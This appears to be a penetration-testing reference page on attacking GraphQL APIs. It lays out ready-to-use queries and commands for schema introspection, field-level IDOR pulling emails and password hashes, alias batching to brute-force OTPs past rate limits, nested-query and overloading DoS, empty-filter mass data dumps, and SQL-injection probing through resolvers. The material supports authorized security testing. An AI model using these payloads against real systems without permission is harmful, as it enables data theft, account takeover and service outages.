---
tags:
  - Web
---

# :material-graphql: GraphQL Attacks

<span class="pill pill-medium">modern APIs</span> <span class="pill pill-info">web</span>

GraphQL exposes one flexible endpoint. That flexibility leaks schema, invites deep queries, and often ships with weaker per-field authorization than REST.

!!! abstract "TL;DR"
    First introspect the schema, then hunt for objects you shouldn't reach (IDOR at the field level), mutations without authz, and DoS via nested queries.

## :material-file-tree: Introspection

```graphql
{ __schema { types { name fields { name } } } }
```

If introspection is disabled, try `clairvoyance` to brute the schema, or grep the JS bundle for query names. Load results into **GraphQL Voyager** or **InQL** (Burp).

## :material-account-off: Broken authorization

Query objects directly by ID — per-field authz is often missing:

```graphql
query { user(id: 2) { email passwordHash } }
```

Batch many IDs in one request (an implicit IDOR sweep):

```graphql
{ a: user(id:1){email} b: user(id:2){email} c: user(id:3){email} }
```

## :material-alert-octagon: Query DoS & batching

```graphql
query { posts { author { posts { author { posts { id } } } } } }
```

Deeply nested/circular queries can exhaust the backend. Aliased **query batching** also bypasses rate limits (e.g. brute-forcing OTPs in one HTTP request).

!!! opsec "One request, thousands of ops"
    Batched brute force looks like a single request in logs but hammers the resolver — effective and quiet, but heavy on the DB.

## :material-fingerprint: Fingerprint & endpoint discovery

Locate the endpoint, then identify the server implementation — the engine tells you
which quirks apply (batching support, field suggestions, introspection defaults):

```text
# Common endpoint paths
/graphql   /graphiql   /api/graphql   /v1/graphql   /graphql/console   /query
```

```bash
graphw00f -d -t https://$TARGET/graphql     # fingerprint the GraphQL engine
graphql-cop -t https://$TARGET/graphql      # audit for common misconfigs
```

## :material-lightbulb-on: Field suggestion & schema recovery

Even with introspection disabled, many servers "did you mean" suggest valid field
names on a typo — brute the schema this way:

```graphql
{ user { emial } }     # server replies: Did you mean "email"?
```

`clairvoyance` automates this suggestion-based recovery. Also grep the front-end JS
bundle for query/mutation strings and operation names.

## :material-file-tree: Full introspection query

The minimal `{ __schema { types { name } } }` is enough to detect it, but a full
`IntrospectionQuery` (with `queryType`, `mutationType`, nested `ofType`, `args`,
`directives`) yields a complete SDL you can load into **GraphQL Voyager** for a map.
`inql` (standalone `pip install inql`) also flags DoS-able cycles:

```bash
inql -t https://$TARGET/graphql --generate-cycles --cycles-streaming
```

## :material-database-arrow-down: Empty-object mass data pull (BOLA)

A common broken-object-level-authz pattern: passing an **empty filter/body** returns
*all* records of a type. If the object type is already named in the request, you may
not even need to specify it:

```json
{"colname":"<entityname>","requestBody":{}}
```

!!! loot "Empty filter dumps the table"
    Sending `{}` where a filter is expected has returned 60+ MB responses — every
    trip, every employee record. Always test the empty-object case against list
    resolvers.

## :material-alert-octagon: More DoS amplifiers

Beyond nested/aliased batching, these single-request amplifiers each force redundant
resolver work when the server lacks complexity limits:

- **Alias overloading** — request the same expensive field hundreds of times under
  different aliases in one query.
- **Field duplication** — repeat the same field many times; each instance is
  resolved again.
- **Directive overloading** — spam duplicated directives (`@include`, or any custom
  directive discovered via introspection) to overwhelm the parser/executor.
- **Array-based batching** — POST a JSON array of many operations in one request.

## :material-needle: Injection through resolvers

If the schema hints at semi-arbitrary backend queries, a resolver may pass input
into SQL/NoSQL. Test injection inside argument values and use **GraphQLmap** to
enumerate methods and fuzz:

```bash
graphqlmap -u https://$TARGET/graphql
# then: {"query":"{ user(name:\"a'\"){id} }"}   # error-based SQLi probing
```

Payload reference: [PayloadsAllTheThings — GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).

!!! bug "Mutations are the dangerous ones"
    Walk introspected mutations one by one — they can create/change/delete records
    (users, passwords) and frequently ship without the authz the queries have. Never
    fire an unknown mutation blindly on a live target.

## :material-link-variant: Related

- Field-level IDOR ties back to [Auth Bypass](auth-bypass.md).
- Injection can still hide in resolvers → [SQL Injection](sqli.md).
- Reference: [PortSwigger GraphQL](https://portswigger.net/web-security/graphql).
